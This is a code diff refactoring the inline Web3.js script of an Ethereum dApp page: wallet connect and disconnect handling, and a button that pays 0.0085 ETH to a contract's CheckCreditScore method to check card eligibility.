@@ -242,8 +242,33 @@ text-align : left;
 
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
-<script>
-       let walletConnected = false;
+ <script>
+
+// ------ new code
+
+    // Initialize Web3.js
+    let web3;
+
+    // Function to initialize Web3
+    async function initWeb3() {
+        if (window.ethereum) {
+            web3 = new Web3(window.ethereum);
+            try {
+                // Request account access if needed
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+            } catch (error) {
+                console.error('User denied account access');
+            }
+        } else if (window.web3) {
+            web3 = new Web3(window.web3.currentProvider);
+        } else {
+            console.error('No Ethereum provider detected');
+        }
+    }
+
+    // Initialize Web3 before using it
+    initWeb3().then(() => {
+        // Initialize the contract
         const contractAddress = "0x04199279852E6284EF85a9aB579567840BA6B991";
         const contractABI = [
 	{
@@ -574,20 +599,19 @@ text-align : left;
 		"type": "function"
 	}
 ]; // Your contract ABI here
-
-        // Initialize Web3.js
-        const web3 = new Web3(Web3.givenProvider);
-
-        // Initialize the contract
         const contract = new web3.eth.Contract(contractABI, contractAddress);
 
- 
+        let walletConnected = false;
+
         document.getElementById('connect-wallet').addEventListener('click', async () => {
             try {
                 const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                 walletConnected = true;
-		const walletAddress = accounts[0];
-		document.getElementById('disconnect-wallet').style.display = 'inline';
+                const walletAddress = accounts[0];
+
+                document.getElementById('wallet-address').textContent = "Wallet Address : " + walletAddress;
+
+                document.getElementById('disconnect-wallet').style.display = 'inline';
                 document.getElementById('connect-wallet').style.display = 'none';
             } catch (error) {
                 document.getElementById('popup-status').textContent = 'Error connecting wallet';
@@ -597,24 +621,21 @@ text-align : left;
         document.getElementById('disconnect-wallet').addEventListener('click', () => {
             ethereum.send('eth_requestAccounts').then(() => {
                 walletConnected = false;
+                document.getElementById('wallet-address').textContent = "";
                 document.getElementById('connect-wallet').style.display = 'inline';
                 document.getElementById('disconnect-wallet').style.display = 'none';
-                });
+            });
         });
 
-
-	function openPopup()
-	{
-
-           if (!walletConnected) {
+        function openPopup() {
+            if (!walletConnected) {
                 flashNotification('Connect wallet first', 'grey');
                 return;
             }
 
-		var popup = document.getElementById("process-transaction-popup");
-		popup.style.display = "flex";
-
-	}
+            var popup = document.getElementById("process-transaction-popup");
+            popup.style.display = "flex";
+        }
 
         document.getElementById('close-popup').addEventListener('click', () => {
             document.getElementById('process-transaction-popup').style.display = 'none';
@@ -624,7 +645,7 @@ text-align : left;
             document.getElementById('transaction-status').style.display = 'none';
         });
 
-function flashNotification(message, color) {
+        function flashNotification(message, color) {
             const notification = document.getElementById('notification');
             notification.style.backgroundColor = color;
             notification.textContent = message;
@@ -634,41 +655,36 @@ function flashNotification(message, color) {
             }, 3000);
         }
 
-function checkScore()
-{
-console.log("Checking Score");
-}
-
-
-document.getElementById('apply-card').addEventListener('click', async () => {
+        document.getElementById('apply-card').addEventListener('click', async () => {
             try {
+                if (!walletConnected) {
+                    flashNotification('Connect wallet first', 'grey');
+                    return;
+                }
 
- 		if (!walletConnected) {
-                		flashNotification('Connect wallet first', 'grey');
-                		return;
-            	}
                 document.getElementById('popup-status').textContent = 'Approve Transaction';
                 document.getElementById('popup-message').textContent = `You have to approve the transaction to check your eligibility.`;
 
-		var popup = document.getElementById("process-transaction-popup");
-		popup.style.display = "flex";
-                const fromAddress = ethereum.selectedAddress;
-		
-		const weiAmount = web3.utils.toWei('0.0085', 'ether');
+                var popup = document.getElementById("process-transaction-popup");
+                popup.style.display = "flex";
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                const fromAddress = accounts[0];
+
+                const weiAmount = web3.utils.toWei('0.0085', 'ether');
                 const gas = await contract.methods.CheckCreditScore().estimateGas({ value: weiAmount, from: fromAddress });
-		await contract.methods.CheckCreditScore().send({ from: fromAddress, value: weiAmount, gas });
+                await contract.methods.CheckCreditScore().send({ from: fromAddress, value: weiAmount, gas });
 
-
-		var popup = document.getElementById("process-transaction-popup");
-		popup.style.display = "flex";
-            document.getElementById('process-transaction-popup').style.display = 'none';
+                var popup = document.getElementById("process-transaction-popup");
+                popup.style.display = "flex";
+                document.getElementById('process-transaction-popup').style.display = 'none';
 
             } catch (error) {
                 document.getElementById('popup-status').textContent = 'Transaction Failed';
                 document.getElementById('popup-message').textContent = `❌ Error: ${error.message}`;
-
             }
         });
+
+    });
 </script>
 
 </body>
